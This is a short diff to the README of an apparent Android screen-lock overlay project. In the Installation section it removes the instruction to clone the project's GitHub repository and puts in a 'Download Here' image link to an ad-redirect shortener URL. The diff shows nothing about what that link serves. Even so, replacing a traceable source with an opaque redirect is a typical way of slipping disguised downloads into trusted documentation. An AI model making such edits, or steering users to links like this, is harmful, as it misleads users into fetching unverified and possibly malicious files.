@@ -43,7 +43,4 @@ It works seamlessly on **legacy Android 4.x tablets** up through **modern Androi
 ---
 
 ## Installation
-
-1. Clone or download this repository:  
-   ```bash
-   git clone https://github.com/archanaberry/screenlock-overlay.git
+![Download Here](https://link.adsafelink.com/b4Dg8)
